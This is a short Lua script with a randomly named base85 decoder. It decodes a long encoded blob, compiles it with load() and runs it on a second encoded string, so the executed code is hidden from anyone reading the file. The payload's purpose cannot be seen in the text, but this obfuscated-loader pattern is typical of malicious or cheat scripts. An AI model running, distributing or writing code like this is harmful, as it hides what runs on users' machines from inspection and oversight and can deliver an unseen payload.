
local function gDEyVTVqVt(s)
    local m = {}
    local c = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~"
    for i=1,85 do m[string.byte(c,i)] = i-1 end
    local o, v, n, p = {}, 0, 0, {52200625, 614125, 7225, 85, 1}
    for i=1, #s do
        local x = m[string.byte(s,i)]
        if x then
            v = v + x * p[n+1]
            n = n + 1
            if n == 5 then
                table.insert(o, string.char(math.floor(v/16777216), math.floor((v%16777216)/65536), math.floor((v%65536)/256), v%256))
                v, n = 0, 0
            end
        end
    end
    return table.concat(o)
end
local vm_func = load(gDEyVTVqVt("3T$s<VQe6Gc3MSwYf(x;ZXi7%b98cPZf7oIXkl_FIW;XZH!L?XD>F7MF*G<WGdV0aI4d+VEH*PMGc+tQFgGnSGAuDPHZ3zSEH^nTG%+kSI4dzYEI2eRF*YnQH8L$TGb}eZD>E`IF*7kOF*z(XFe@`KEHN-JEiyJNHZm(TGAubZEipALF*Y(SG%zeRGb=JUEHW}HGBzwYGA%MUEHN`QEi*JMF)%YNGBGSTG%YeWEIBkSGBPYSGb=GREHpMNGBqqYGc7VREHpSPGBPYNGcqkSGb}MPF)cJTEHyVPGBqg*Y;R*>Y#?TJZew(5Z*CxKOIA>3PEtx%c_?8lVksbOZ)0I>AaE>WJuxgWJ0N#xX>4U6VLmV*VQyp~Vm>e+WN#pBZ)0I>AaY?Wa$-GUB{D2xB{Dl8X=WgDVSYVwVjy&AWo{s2J!30yAZ2c3J0M{!Vk~eyC}AyfVJR;%EGS|va$+ejGAwW^GCLq;Ze%+kX=Wf{JYpbpXk~67VLf6XWo~3UAa`hKY-J!}J}@9;Zy;=MV_|F{a$!ATB{Dl8X=WgDVLmV*bZBL6AY(maD{vrXZe%+kVJvVxC}AyfVJR;%EO06^J0N9lWIG^oWps6NZXjbjAZ2c3I|^)XV_|F{W_503bZKvHAY^HGQ%6c^K}KUJWGo<SDGDGUARugSV_|F{b09q+dwn2gZ*m}MJuoaXH8mh)Zy<A9X<a>OAZ2c33LqdLAZ%}AVQe63AUz;33LqdLAZBlJAZa}?EHX7UAY^X}ARr(hARr(hY9KuzC~6=pAah%3T_7tUb98cPZf7oHd30qcYb+orX&@yaBWo!jD<Cl`DIg^vGBq{|ARr(hARr(hb6aU$EFg1RYF!{bAah%4T`VATTWMViARr(hWo~2&ARr(hY;R*>Y#?bYAa8YaEFfwiJs>bFAbWi*ATSCbARr)SZ*m}MWOzL>EFdFfAY^X}ARr(hARr(hX&^lyC}|)oATcQ*B_J|2HVPmhARr(hARuZWJs>D*AS)nqTWMV>ASEC&H8u($ARr(hARr)fTWMV^Aah%4T_8Omb6aX%EFg1RX<Z5+ARr(hARr)bb#z-JZ*_DlF<l@%AaitbX>MmOV`yP=C~HerP-ae2N>+I&b98cPZf7oHd30qcWGo<QWOykoAah$Nb6aU$AS)nqTWVb?ASEC&H8x!-DGDGUARuLKWC|c4ARuyObairWAar43Y-KKEZ*F5@bSQ6ibSVmDZe$8_Wps6NZXjlLZew(5Z*C}XUt%~lDGDGUARugSV_|F{ZDDXAJs^913LqdLAZ%}AVQe5{Xkl`5AUz-=FflSSG&MFiI5|N=LqtVJM@UIZOH55pPf$@(Q&d$}S6EqEVPa!sWoBn+X=-b1ZEkOHadLBXb#`}nd3qruBqb&&DJm;1J3Ku;KR{kzV0(Ohej*AWARr)SZ*m}MJuxgeH6UbfAZ=lATXS@BX>MmOVtI6BC}U`0a&s(cDP15vAZaZzAZ2c33LqdLAZ%}AVQe68b#yEsc42HRAZ{!ma3DP(dwnb*Ff1T2EFgO|GBPkQHZnCVAT}{HF)}qQAU85HH7p=FH7p=8eF`8TARuOMav*6vF)Sb>a9?6LH6Ubf3LqdLARr(hAZ%}AVQe6FAUz;$VQ^b>baH8KXD(uSbY&=TUt%~lEFftqT?!x|ARr(hARuXGAa)>hXk~5+ARr(hARr(hARr(hc42HFJs@^rY#=Kjb|5Msa9eIGF<lBEARr(hARr(hARr)aAUz;%AS)m-3LqdLARr(hARr(hAZcbGZXi89AT=O#Xk~5+ARr(hARr(hARr(hARr(hbYWs_WiDxMb7gXLC~tLiEFg1qa%pa7E@Nn6awu(KbZ9PSY;SLJD0X3NFEKVZH#agdHYqG1ZDDk1E@o_RZ*nLoc42HKF*Y|hH!?9cDK9oPH8VCTEFf)RbZ9PSY;SLJC@6MeY$Y}|H8VCTFETYYDJ&p%VQeKbH8v?J3LqdLARr(hARr(hARr(hAa-GFEFf+mJs>bFATSCbARr(hARr(hARr)RZe$7|ARr(hARr)RZe$7|ARr)RZe$7|ARr)YZ)0I>AaZ4MAUz;tX?IgcN@+nxV<>cCVr*qDV{dL_VRR^Ob#y5#Aa{0JMR{vcN<nTZ3LqdLAZ%}AVQe5~AUz;#Z((F8a%FQV3LqdLAZcbGW*~HEWo{s5C@COiZe$8&Ze$7"))
if vm_func then vm_func()("%&6_WF!W1JHXl$mOcy<Zr4nKBd+5|K6&bN~K6;N+i}Ti~6M}(d9BZj>Ixq7=JzoeMZr3)y{bxT(?e#*xO9s+MC(d8&wO~58W{I;{uW@*F6s~%Ga!Z~G") end
